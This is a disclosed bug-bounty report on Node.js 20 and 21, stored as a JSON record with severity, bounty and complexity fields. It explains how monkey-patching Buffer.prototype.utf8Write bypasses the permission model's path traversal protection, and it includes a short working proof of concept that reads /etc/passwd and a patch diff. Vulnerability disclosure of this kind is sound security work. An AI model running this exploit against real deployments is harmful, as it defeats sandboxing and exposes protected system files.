{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "tniessen ",
  "title": "Path traversal by monkey-patching Buffer internals",
  "content": "\nSummary: In Node.js 20 and Node.js 21, the permission model protects itself against path traversal attacks by calling path.resolve() on any paths given by the user. If the path is to be treated as a Buffer, the implementation uses Buffer.from() to obtain a Buffer from the result of path.resolve(). By monkey-patching Buffer internals, namely, Buffer.prototype.utf8Write, the application can modify the result of path.resolve(), which leads to a path traversal vulnerability.\nDescription: This vulnerability was introduced in commit 1f64147e, which itself was a patch of a path traversal vulnerability (see CVE-2023-32004, report 2038134). Subsequent commits made the implementation more resilient against monkey-patching, for example, by not allowing users to replace path.resolve() (commit 32bcf4ca) or Buffer.from() (commit f447a461) with user-defined functions. Nevertheless, the internals of Buffer.from can be monkey-patched in multiple ways. Most importantly, overwriting Buffer.prototype.utf8Write with a user-defined function enables a straightforward path traversal vulnerability because virtually any sanitization performed by path.resolve() can be overridden by the user.\nSteps to reproduce:\nThis can be exploited simply by overwriting Buffer.prototype.utf8Write with a user-defined function. The code is supposed to only have access to /tmp, yet it successfully reads /etc/passwd.\nCode 564 Bytes\n1$ node --experimental-permission --allow-fs-read=/tmp \n2Welcome to Node.js v20.8.1.\n3Type \".help\" for more information.\n4> Buffer.prototype.utf8Write = ((w) => function (str, ...args) {\n5...   return w.apply(this, [str.replace(/^\\/exploit/, '/tmp/..'), ...args]);\n6... })(Buffer.prototype.utf8Write);\n7[Function (anonymous)]\n8> fs.readFileSync(new TextEncoder().encode('/exploit/etc/passwd'))\n9<Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 64 61 65 6d 6f 6e 3a 78 3a 31 3a 31 3a 64 61 65 6d 6f ... 3174 more bytes>\nThis example pretends to attempt to read /exploit/etc/passwd, which would ultimately be denied. However, after the permission model implementation has called path.resolve(), the exploit intercepts the internal call to utf8Write() within Buffer.from() and replaces the sanitized path with /tmp/../etc/passwd, thus bypassing the path traversal protection logic. Because Node.js assumes that the path has been resolved at this point, it allows access because the path begins with /tmp/.\nSuggested minimal patch:\nCode 831 Bytes\n1diff --git a/lib/internal/fs/utils.js b/lib/internal/fs/utils.js\n2index 611b6c2420..d7e6ec3aa2 100644\n3--- a/lib/internal/fs/utils.js\n4+++ b/lib/internal/fs/utils.js\n5@@ -66,4 +66,6 @@ const kStats = Symbol('stats');\n6 const assert = require('internal/assert');\n7 \n8+const { encodeUtf8String } = internalBinding('encoding_binding');\n9+\n10 const {\n11   fs: {\n12@@ -720,5 +722,8 @@ function possiblyTransformPath(path) {\n13     assert(isUint8Array(path));\n14     if (!BufferIsBuffer(path)) path = BufferFrom(path);\n15-    return BufferFrom(resolvePath(BufferToString(path)));\n16+    // Avoid Buffer.from() and use a C++ binding instead to encode the result\n17+    // of path.resolve() in order to prevent path traversal attacks that\n18+    // monkey-patch Buffer internals.\n19+    return encodeUtf8String(resolvePath(BufferToString(path)));\n20   }\n21   return path;\nSupporting Material/References:\nThe vulnerable implementation of possiblyTransformPath().\nCommit 1f64147e, which introduced the vulnerability.\nPrevious path traversal vulnerabilities: CVE-2023-30584, CVE-2023-32004, CVE-2023-39331, and CVE-2023-39332.\nImpact\nThe impact is virtually the same as that of previous path traversal vulnerabilities: CVE-2023-30584, CVE-2023-32004, CVE-2023-39331, and CVE-2023-39332. Applications can access file system paths that access should be denied to based on the configured process permissions, and may be able to perform write operations on read-only resources.\nThis affects the most recent versions of Node.js on both the Node.js 20 and Node.js 21 release lines.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 2430,
  "weaknesses": [
    "Path Traversal"
  ],
  "screenshots": {},
  "disclosed_date": 1717007520,
  "report_url": "https://hackerone.com/reports/2434811",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Start Node.js with experimental permissions and restricted file system access: `node --experimental-permission --allow-fs-read=/tmp`"
    ],
    [
      2,
      "Monkey-patch Buffer.prototype.utf8Write to manipulate path resolution: `Buffer.prototype.utf8Write = ((w) => function (str, ...args) { return w.apply(this, [str.replace(/^\\/exploit/, '/tmp/..'), ...args]); })(Buffer.prototype.utf8Write);`"
    ],
    [
      3,
      "Attempt to read a restricted file using the manipulated path: `fs.readFileSync(new TextEncoder().encode('/exploit/etc/passwd'))`"
    ]
  ],
  "vuln_description": "The vulnerability allows path traversal by monkey-patching Buffer internals in Node.js 20 and 21. The permission model's path resolution can be bypassed by modifying Buffer.prototype.utf8Write, enabling access to files outside the allowed directories.",
  "reason": "This vulnerability requires understanding of Node.js internals, specifically how path resolution and Buffer manipulation interact. The attacker must know about the specific Buffer method to patch and how it affects path resolution, which is non-obvious and involves multiple components (path resolution, Buffer internals, and permission checks).",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": "2038134"
}